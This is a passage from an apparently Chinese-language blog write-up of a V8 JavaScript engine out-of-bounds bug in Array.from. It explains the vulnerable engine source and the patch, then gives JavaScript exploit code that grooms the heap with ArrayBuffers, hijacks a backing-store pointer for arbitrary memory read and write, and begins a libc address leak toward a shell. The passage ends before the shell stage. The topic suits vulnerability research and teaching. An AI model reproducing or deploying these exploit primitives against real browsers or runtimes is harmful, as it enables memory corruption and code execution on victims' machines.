class="line">    BIND(&amp;error);				<span class="comment">//如果跳转到error，会运行这里</span></span><br><span class="line">    ThrowTypeError(context, MessageTemplate::kCalledNonCallable, map_function);</span><br><span class="line"></span><br><span class="line">    BIND(&amp;no_error);		<span class="comment">//如果跳转no error，就会从这里开始运行</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Label iterable(this), not_iterable(this), finished(this), if_exception(this);//设置标签</span><br><span class="line"></span><br><span class="line">  TNode&lt;Object&gt; this_arg = args.GetOptionalArgumentValue(<span class="number">2</span>);					<span class="comment">//获取Object的参数</span></span><br><span class="line">  TNode&lt;Object&gt; items = args.GetOptionalArgumentValue(<span class="number">0</span>);							<span class="comment">//获取我们的ArrayLike</span></span><br><span class="line">  <span class="comment">// The spec doesn&#x27;t require ToObject to be called directly on the iterable</span></span><br><span class="line">  <span class="comment">// branch, but it&#x27;s part of GetMethod that is in the spec.</span></span><br><span class="line">  TNode&lt;JSReceiver&gt; array_like = ToObject(context, items);						<span class="comment">//将ArrayLike转化为对象</span></span><br><span class="line"></span><br><span class="line">  TVARIABLE(Object, <span class="built_in">array</span>);</span><br><span class="line">  TVARIABLE(Number, length);																					<span class="comment">//定义Number变量，值为length</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Determine whether items[Symbol.iterator] is defined:</span></span><br><span class="line">  <span class="comment">//确认items的迭代器是否被定义（Array类型包含Symbol.iteractor迭代器）</span></span><br><span class="line">  <span class="function">IteratorBuiltinsAssembler <span class="title">iterator_assembler</span><span class="params">(state())</span></span>;</span><br><span class="line">  Node* iterator_method =</span><br><span class="line">      iterator_assembler.GetIteratorMethod(context, array_like);   <span class="comment">//从array_like中获取迭代器</span></span><br><span class="line">  Branch(IsNullOrUndefined(iterator_method), &amp;not_iterable, &amp;iterable);<span class="comment">//分支，可迭代和不可迭代</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//可迭代的情况运行此处代码</span></span><br><span class="line">  BIND(&amp;iterable);</span><br><span class="line">  &#123;</span><br><span class="line">    TVARIABLE(Number, index, SmiConstant(<span class="number">0</span>));</span><br><span class="line">    TVARIABLE(Object, var_exception);</span><br><span class="line">    Label loop(this, &amp;index), loop_done(this),</span><br><span class="line">        on_exception(<span class="keyword">this</span>, Label::kDeferred),</span><br><span class="line">        index_overflow(<span class="keyword">this</span>, Label::kDeferred);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the method is callable.</span></span><br><span class="line">    <span class="comment">//检测迭代器是否可用</span></span><br><span class="line">    &#123;</span><br><span class="line">      Label get_method_not_callable(this, Label::kDeferred), next(this);</span><br><span class="line">      GotoIf(TaggedIsSmi(iterator_method), &amp;get_method_not_callable);</span><br><span class="line">      GotoIfNot(IsCallable(iterator_method), &amp;get_method_not_callable);</span><br><span class="line">      Goto(&amp;next);<span class="comment">//可用则跳转到next</span></span><br><span class="line"></span><br><span class="line">      BIND(&amp;get_method_not_callable);</span><br><span class="line">      ThrowTypeError(context, MessageTemplate::kCalledNonCallable,</span><br><span class="line">                     iterator_method);</span><br><span class="line"></span><br><span class="line">      BIND(&amp;next); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Construct the output array with empty length.</span></span><br><span class="line">    <span class="built_in">array</span> = ConstructArrayLike(context, args.GetReceiver());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Actually get the iterator and throw if the iterator method does not yield</span></span><br><span class="line">    <span class="comment">// one.</span></span><br><span class="line">    IteratorRecord iterator_record =</span><br><span class="line">        iterator_assembler.GetIterator(context, items, iterator_method);</span><br><span class="line"></span><br><span class="line">    TNode&lt;Context&gt; native_context = LoadNativeContext(context);</span><br><span class="line">    TNode&lt;Object&gt; fast_iterator_result_map =</span><br><span class="line">        LoadContextElement(native_context, Context::ITERATOR_RESULT_MAP_INDEX);</span><br><span class="line"></span><br><span class="line">    Goto(&amp;loop);</span><br><span class="line">    </span><br><span class="line">		<span class="comment">//进入迭代循环，循环到迭代器运行结束（这个时候结合我们poc里的迭代器，理解漏洞）</span></span><br><span class="line">    BIND(&amp;loop);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Loop while iterator is not done.</span></span><br><span class="line">      TNode&lt;Object&gt; next = CAST(iterator_assembler.IteratorStep(</span><br><span class="line">          context, iterator_record, &amp;loop_done, fast_iterator_result_map));</span><br><span class="line">      TVARIABLE(Object, value,</span><br><span class="line">                CAST(iterator_assembler.IteratorValue(</span><br><span class="line">                    context, next, fast_iterator_result_map))); <span class="comment">//获取迭代器返回的值</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// If a map_function is supplied then call it (using this_arg as</span></span><br><span class="line">      <span class="comment">// receiver), on the value returned from the iterator. Exceptions are</span></span><br><span class="line">      <span class="comment">// caught so the iterator can be closed.</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="function">Label <span class="title">next</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">        GotoIf(IsUndefined(map_function), &amp;next);</span><br><span class="line"></span><br><span class="line">        CSA_ASSERT(<span class="keyword">this</span>, IsCallable(map_function));</span><br><span class="line">        Node* v = CallJS(CodeFactory::Call(isolate()), context, map_function,</span><br><span class="line">                         this_arg, value.value(), index.value());</span><br><span class="line">        GotoIfException(v, &amp;on_exception, &amp;var_exception);</span><br><span class="line">        value = CAST(v);</span><br><span class="line">        Goto(&amp;next);</span><br><span class="line">        BIND(&amp;next);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Store the result in the output object (catching any exceptions so the</span></span><br><span class="line">      <span class="comment">// iterator can be closed).</span></span><br><span class="line">      Node* define_status =</span><br><span class="line">          CallRuntime(Runtime::kCreateDataProperty, context, <span class="built_in">array</span>.value(),</span><br><span class="line">                      index.value(), value.value());</span><br><span class="line">      GotoIfException(define_status, &amp;on_exception, &amp;var_exception);</span><br><span class="line">      </span><br><span class="line">      index = NumberInc(index.value());  <span class="comment">//获取index的值</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// The spec requires that we throw an exception if index reaches 2^53-1,</span></span><br><span class="line">      <span class="comment">// but an empty loop would take &gt;100 days to do this many iterations. To</span></span><br><span class="line">      <span class="comment">// actually run for that long would require an iterator that never set</span></span><br><span class="line">      <span class="comment">// done to true and a target array which somehow never ran out of memory,</span></span><br><span class="line">      <span class="comment">// e.g. a proxy that discarded the values. Ignoring this case just means</span></span><br><span class="line">      <span class="comment">// we would repeatedly call CreateDataProperty with index = 2^53.</span></span><br><span class="line">      CSA_ASSERT_BRANCH(<span class="keyword">this</span>, [&amp;](Label* ok, Label* not_ok) &#123;</span><br><span class="line">        BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),</span><br><span class="line">                                           NumberConstant(kMaxSafeInteger), ok,</span><br><span class="line">                                           not_ok);</span><br><span class="line">      &#125;);</span><br><span class="line">      Goto(&amp;loop);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;loop_done);</span><br><span class="line">    &#123;</span><br><span class="line">      length = index;						<span class="comment">//将index赋值给length（index在poc中应该为8224）</span></span><br><span class="line">      Goto(&amp;finished);					<span class="comment">//跳转到finished代码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;on_exception);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Close the iterator, rethrowing either the passed exception or</span></span><br><span class="line">      <span class="comment">// exceptions thrown during the close.</span></span><br><span class="line">      iterator_assembler.IteratorCloseOnException(context, iterator_record,</span><br><span class="line">                                                  &amp;var_exception);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Since there&#x27;s no iterator, items cannot be a Fast JS Array.</span></span><br><span class="line">  BIND(&amp;not_iterable);</span><br><span class="line">  &#123;</span><br><span class="line">    CSA_ASSERT(<span class="keyword">this</span>, Word32BinaryNot(IsFastJSArray(array_like, context)));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Treat array_like as an array and try to get its length.</span></span><br><span class="line">    length = ToLength_Inline(</span><br><span class="line">        context, GetProperty(context, array_like, factory()-&gt;length_string()));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Construct an array using the receiver as constructor with the same length</span></span><br><span class="line">    <span class="comment">// as the input array.</span></span><br><span class="line">    <span class="built_in">array</span> = ConstructArrayLike(context, args.GetReceiver(), length.value());</span><br><span class="line"></span><br><span class="line">    TVARIABLE(Number, index, SmiConstant(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    GotoIf(SmiEqual(length.value(), SmiConstant(<span class="number">0</span>)), &amp;finished);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Loop from 0 to length-1.</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function">Label <span class="title">loop</span><span class="params">(<span class="keyword">this</span>, &amp;index)</span></span>;</span><br><span class="line">      Goto(&amp;loop);</span><br><span class="line">      BIND(&amp;loop);</span><br><span class="line">      TVARIABLE(Object, value);</span><br><span class="line"></span><br><span class="line">      value = GetProperty(context, array_like, index.value());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// If a map_function is supplied then call it (using this_arg as</span></span><br><span class="line">      <span class="comment">// receiver), on the value retrieved from the array.</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="function">Label <span class="title">next</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">        GotoIf(IsUndefined(map_function), &amp;next);</span><br><span class="line"></span><br><span class="line">        CSA_ASSERT(<span class="keyword">this</span>, IsCallable(map_function));</span><br><span class="line">        value = CAST(CallJS(CodeFactory::Call(isolate()), context, map_function,</span><br><span class="line">                            this_arg, value.value(), index.value()));</span><br><span class="line">        Goto(&amp;next);</span><br><span class="line">        BIND(&amp;next);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Store the result in the output object.</span></span><br><span class="line">      CallRuntime(Runtime::kCreateDataProperty, context, <span class="built_in">array</span>.value(),</span><br><span class="line">                  index.value(), value.value());</span><br><span class="line">      index = NumberInc(index.value());</span><br><span class="line">      BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),</span><br><span class="line">                                         length.value(), &amp;loop, &amp;finished);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  BIND(&amp;finished); <span class="comment">//finished入口</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Finally set the length on the output and return it.</span></span><br><span class="line">  GenerateSetLength(context, <span class="built_in">array</span>.value(), length.value()); <span class="comment">//调用我们的漏洞函数，将length输入</span></span><br><span class="line">  args.PopAndReturn(<span class="built_in">array</span>.value());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总结ArrayFrom的大概流程，为了方便省略了call部分，我们只需要知道我们对数组的操作都做用于oobArray即可。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/baKf21.png" alt="baKf21"></p>
<p>这时候再分析poc就很清楚，关键点是每一次迭代都会调用<code>oobArray.length = 0;</code>，所以导致输入数组的array.length（数组长度）&lt;length（迭代次数）。然后调用StoreObjectFieldNoWriteBarrier产生越界。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,</span><br><span class="line">                                     length_smi); <span class="comment">//将length_smi赋值给JSArray的Length</span></span><br></pre></td></tr></table></figure>
<p>此处便是将length_smi(迭代次数)，传递给了JSArray的length，上层函数中JSArray就是我们的oobArray对象，length_smi则是oobArray内部的FixedArray（Element）迭代时累加的产物。</p>
<p>漏洞产生的原因主要是因为开发者没有考虑到，传入的ArrayLike也可以是真的数组（oobArray），而真实的数组的length是可以改变的。从而使得获取到的Array的对象（因为被我们置零了）实际长度是小于迭代次数。即产生了oobArray.length要大于Elements的数组空间的现象。</p>
<p><em>Patch</em>方式我们也都看到了，只需要将大于的情况也调用*&amp;runtime*创建空间即可。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>###内存模型</p>
<p>首先需要理解V8的一部分内存模型，这部分可以参考我在<a href="https://migraine-sudo.github.io/2020/02/15/v8/">V8基础</a>里的介绍。</p>
<p><em><strong>关键字：JSFunction和ArrayBuffer</strong></em></p>
<h3 id="实现OOB-r-amp-w"><a href="#实现OOB-r-amp-w" class="headerlink" title="实现OOB r&amp;w"></a>实现OOB r&amp;w</h3><p>从越界读写到oob read&amp;write，需要借助ArrayBuffer对象。通过oobArray的数组越界，覆盖ArrayBuffer的Backing Store，实现任意地址读写。</p>
<p>我们需要在GC堆中布置一定数量的ArrayBuffer结构，希望至少其中某个能oobArray的越界写入范围。</p>
<p>参考图来自<a target="_blank" rel="noopener" href="http://eternalsakura13.com/2018/05/06/v8/">sakura师傅翻译的v8exploit</a></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/vPeo1k.png" alt="vPeo1k"></p>
<p><em>类型转换</em></p>
<p><em>此处需要了解TypeArray&amp;ArrayBuffer</em></p>
<p>读写操作时，需要进行类型转换。<em>Float - Uint</em></p>
<p>我们的oobArray&#x3D;[1.1]，读写都是Float类型的，所以需要做个类型转换。而且64位下只有Uint32Array，只能读取32bit的数据。我们利用Float64Array进行读取，然后转化为两个Uint32Array。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*l类型转换类*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChangeType</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123; 							<span class="comment">//构造函数</span></span><br><span class="line">		<span class="built_in">this</span>.buf=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">		<span class="built_in">this</span>.f64=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">		<span class="built_in">this</span>.u32=<span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="built_in">this</span>.buf);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">f2i</span>(<span class="params">val</span>)</span>&#123;									<span class="comment">//将两个Uint32转化为一个Float64</span></span><br><span class="line">		<span class="built_in">this</span>.f64[<span class="number">0</span>]=val;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">this</span>.u32[<span class="number">1</span>]*<span class="number">0x100000000</span>+<span class="built_in">this</span>.u32[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">i2f</span>(<span class="params">val</span>)</span>&#123;									<span class="comment">//将一个Float64转化为两个Uint32</span></span><br><span class="line">		<span class="built_in">this</span>.u32[<span class="number">0</span>]=<span class="built_in">parseInt</span>(val%<span class="number">0x100000000</span>);</span><br><span class="line">		<span class="built_in">this</span>.u32[<span class="number">1</span>]=<span class="built_in">parseInt</span>((val-<span class="built_in">this</span>.u32[<span class="number">0</span>])/<span class="number">0x100000000</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)								//打印16进制</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ct=<span class="keyword">new</span> ChangeType();  </span><br></pre></td></tr></table></figure>
<p><em>寻找ArrayBuffer对象</em></p>
<p>我们在迭代器中布置100个ArrayBuffer对象，将对象存入进一个arrays。经过GC回收内存后，这些对象会被GC移动到原oobArray内存（已被释放），就可以通过oobArray对ArrayBuffer进行修改。</p>
<p>在找到可控的ArrayBuffer对象之后，我们可以通过修改ArrayBuffer的length值，然后重新遍历存放ArrayBuffer的数组，确定具体可控对象，然后实现oob read&amp;write。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oobArray = [<span class="number">1.1</span>];  <span class="comment">//让oobArray为float类型 方便之后的读取写入</span></span><br><span class="line"><span class="keyword">let</span> arrays=[];								</span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;						<span class="comment">//8224	</span></span><br><span class="line"><span class="keyword">var</span> a;		</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> ( </span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    <span class="function"><span class="title">next</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="number">1.1</span>;</span><br><span class="line">	<span class="built_in">this</span>.counter++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">this</span>.counter &gt; maxSize) &#123;	 	</span><br><span class="line">	 oobArray.length=<span class="number">1</span>;	<span class="comment">// lenght！=0 避免GC彻底回收，Element会被指向一个空指针，不在原来的地址范围。</span></span><br><span class="line">	<span class="comment">/*布置ArrayBuffer对象*/</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="comment">//let array=new ArrayBuffer(0xbeef); </span></span><br><span class="line">    	et array=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x512</span>); <span class="comment">//创建length=0xbeef的ArrayBuffer</span></span><br><span class="line">	    arrays.push(array);		<span class="comment">//将BufferArray放入数组（疑问：数组会对GC的回收有什么影响？）</span></span><br><span class="line">	    <span class="comment">//%DebugPrint(array);	//Debug用</span></span><br><span class="line">	&#125;		</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*寻找和确定ArrayBuffer对象*/</span></span><br><span class="line"><span class="keyword">let</span> backing_store;</span><br><span class="line"><span class="keyword">let</span> kbitfield;</span><br><span class="line"><span class="keyword">let</span> buf_index;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;=maxSize;i++)&#123;<span class="keyword">let</span> x=oobArray[i]&#125;; <span class="comment">//GC</span></span><br><span class="line"><span class="comment">/*找到oobArry可控的ArrayBuffer*/</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;maxSize;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">let</span> val=ct.f2i(oobArray[i]);</span><br><span class="line">	<span class="comment">//if(val===0xbeef00000000)</span></span><br><span class="line">  <span class="keyword">if</span>(val===<span class="number">0x51200000000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		backing_store=i+<span class="number">1</span>;</span><br><span class="line">		kbitfield=backing_store+<span class="number">1</span>;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">&quot;[*]find target ArrayBuffer in oobArray number [&quot;</span>+i+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">		oobArray[i]=ct.i2f(<span class="number">0xbeaf00000000</span>); <span class="comment">//修改length值</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*确定我们可控ArrayBuffer的ID*/</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//console.log(arrays[i].bytelength);</span></span><br><span class="line">	<span class="keyword">if</span>(arrays[i].byteLength===<span class="number">0xbeaf</span>)&#123;</span><br><span class="line">	   	<span class="built_in">console</span>.log(<span class="string">&quot;[*]find target ArrayBuffer number [&quot;</span>+i+<span class="string">&quot;]&quot;</span>);</span><br><span class="line">		buf_index=i;	</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>一个困扰我很长时间的小问题</strong></p>
<p>在release下使用%DebugPrint(array)时，似乎会发生一些奇怪的事情。这是打印出来的效果。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/jnG9k4.png" alt="jnG9k4"></p>
<p>所有的ArrayBuffer的地址都在一起，查看里面的内存，他们的确拥有一个ArrayBuffer的完整结构，这些所谓的ArrayBuffer的地址都比较高（不管笔者以什么方式创建ArrayBuffer），以至于永远在我们<em>数组越界</em>的范围之外。这样就会导致无法利用。</p>
<p>刚开始笔者猜测是否是因为oobArray的CHUNK没有被GC回收走。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/cHWxpF.png" alt="cHWxpF"></p>
<p>查看内存，刚开始并没有发生什么异样，符合ArrayBuffer的结构。但是仔细看过之后发现ArrayBuffer本该存折Map指针的地方和Map的值并不匹配。不过周围其他值似乎都很正常（length，backing store之类的）我们对这个指针进行解引用。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/XVs8FJ.png" alt="XVs8FJ"></p>
<p>实际上这个经过第二次解引用的指针才是正确的内存，此时的MAP部分已经和%DebugPrint的结构相一致，其他部分也都是完整的。而我们为了找到ArrayBuffer，进行了两次解引用。</p>
<p><em>为什么要多一次解引用呢？</em></p>
<p>应该是与自动回收机制（GC）有关。笔者猜测，可能是之前的内存被释放（oobArray），然后GC将刚才ArrayBuffer从原来的地方Copy走了，统一移动到这块块刚被释放到内存中。这也解释了为什么ArrayBuffer的地址一开始都在oobArray读取的范围外，因为当时GC还没将这块内存释放。（简单来说就是GC把ArrayBuffer带走了，在原地址处留了一个指针，然而我一直不知道那是指针。。浪费了我超久的时间）具体原因还需要看研究一下GC的实现方式，未来再填坑。</p>
<p>实验过程中还发现，如果没有使用arrays数组将ArrayBuffer写入，ArrayBuffer的地址并不会被GC改变。这部分目前还搞不明白，只能看大神们写的exploit。</p>
<hr>
<p><strong>实现任意地址读写</strong></p>
<p>这部分和之前的oobArray读写差不多，直接上代码。</p>
<p><em>注意点：需要同时修改Backing Store和kBitField Offset，这两个相邻变量的值是相同的，经过调试发现同时修改才有效。。</em></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArbitraryRW</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="title">read</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">		oobArray[backing_store]=ct.i2f(addr);</span><br><span class="line">		oobArray[kbitfield]=ct.i2f(addr);</span><br><span class="line">		<span class="built_in">this</span>.f64=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(arrays[buf_index],<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="keyword">return</span> ct.f2i(<span class="built_in">this</span>.f64[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">write</span>(<span class="params">addr,value</span>)</span>&#123;</span><br><span class="line">		oobArray[backing_store]=ct.i2f(addr);</span><br><span class="line">		oobArray[kbitfield]=ct.i2f(addr);</span><br><span class="line">		<span class="built_in">this</span>.f64=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(arrays[buf_index],<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">		<span class="built_in">this</span>.f64[<span class="number">0</span>]=ct.i2f(value);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="title">leak</span>(<span class="params"></span>)</span>&#123; <span class="comment">//泄露backing store指针</span></span><br><span class="line">		<span class="keyword">return</span> ct.f2i(oobArray[backing_store]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> wr=<span class="keyword">new</span> ArbitraryRW();</span><br></pre></td></tr></table></figure>


<h3 id="how2GetShell"><a href="#how2GetShell" class="headerlink" title="how2GetShell"></a>how2GetShell</h3><p>大概把下面三种方式都实验一下</p>
<ul>
<li>泄露libc（很CTF）</li>
<li>Wasm</li>
<li>JIT（因为没有R权限，所以只是尝试一下找到JIT）</li>
</ul>
<h4 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h4><p>泄露堆中包含指向unosort bin的指针，Hpasserby师傅认为在fd或者bk的位置上，0x7f开头的值一定指向&amp;main_arena+88的地址，这样只需要减去偏移地址就能获得libc的地址。<a href="https://migraine-sudo.github.io/2019/11/25/how2heap2/#2-1-0ctf-2017-babyheap">unsortbin泄露地址</a></p>
<p>backingstore一开始的指针指向的就是堆内存，我们可以通过对堆内存进行搜索，来泄露unsoirtbin的指针。</p>
<p><strong>实际测试中</strong>，<em>循环读数据太多次ArrayBuffer对象的地址会跑飞（具体原因未知，可能又被GC挪走了），所以循环次数要控制，不能全部地址都遍历。</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;刚开始的可控ArrayBuffer地址</span><br><span class="line">gdb-peda$ x&#x2F;20xg 0x24903d38e5a9-1</span><br><span class="line">0x24903d38e5a8:	0x00003be96c383fe9	0x000033bd5ef82251</span><br><span class="line">0x24903d38e5b8:	0x000033bd5ef82251	0x0000beaf00000000</span><br><span class="line">0x24903d38e5c8:	0x00005555561b9840	0x00005555561b9840</span><br><span class="line">&#x2F;&#x2F;反复read之后的ArrayBuffer地址</span><br><span class="line">gdb-peda$ x&#x2F;20xg 0x35c638b8e7a9-1</span><br><span class="line">0x35c638b8e7a8:	0x000024903d38e5a8	0x000033bd5ef82251</span><br><span class="line">0x35c638b8e7b8:	0x000033bd5ef82251	0x0000beaf00000000</span><br><span class="line">0x35c638b8e7c8:	0x00005555561b9840	0x00005555561b9840</span><br></pre></td></tr></table></figure>
<p>我使用的是Hpasserby师傅提出方法，直接暴力搜索堆，通过size&#x2F;presize来匹配chunk，找到fd&#x2F;bk是地址为0x7f开头为止。然后减去偏移即可。</p>
<p>用这种方式，比较容易出问题的部分在于ArrayBuffer的大小，太大和太小都会导致heap中不存在unsortbin（错误案例0xbeaf和0x20），毕竟v8的HEAP似乎没有那么被“中用”。所以我这里要修改前面的代码，改用0x512作为ArrayBuffer的长度。筛选时注意条件（见注释）。</p>
